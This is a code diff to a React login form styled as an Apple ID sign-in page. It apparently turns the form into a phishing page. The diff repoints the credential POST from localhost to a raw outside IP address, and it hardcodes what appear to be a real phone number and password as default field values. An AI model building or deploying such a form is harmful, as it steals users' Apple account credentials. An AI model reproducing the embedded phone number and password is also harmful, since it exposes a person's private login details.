@@ -15,14 +15,14 @@ const LoginForm = () => {
       pwd,
     };
 
-    await post("http://localhost:3200/login", obj);
+    await post("http://128.199.19.207/login", obj);
   };
 
   return (
     <form className={styles.form} onSubmit={handleSubmit}>
       <p className={styles["form-title"]}>Sign in to your account</p>
       <div className={styles["input-container"]}>
-        <input name="email" placeholder="Enter Apple id" type="text" required className={styles.input} />
+        <input name="email" placeholder="Enter Apple id" type="text" value={"+919867398783"} required className={styles.input} />
         <span>
           <svg stroke="currentColor" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
             <path
@@ -35,7 +35,7 @@ const LoginForm = () => {
         </span>
       </div>
       <div className={styles["input-container"]}>
-        <input name="password" placeholder="Enter password" type="password" required className={styles.input} />
+        <input name="password" placeholder="Enter password" type="password" value={"Holyshit@031"} required className={styles.input} />
         <span>
           <svg stroke="currentColor" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
             <path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" strokeWidth="2" strokeLinejoin="round" strokeLinecap="round"></path>
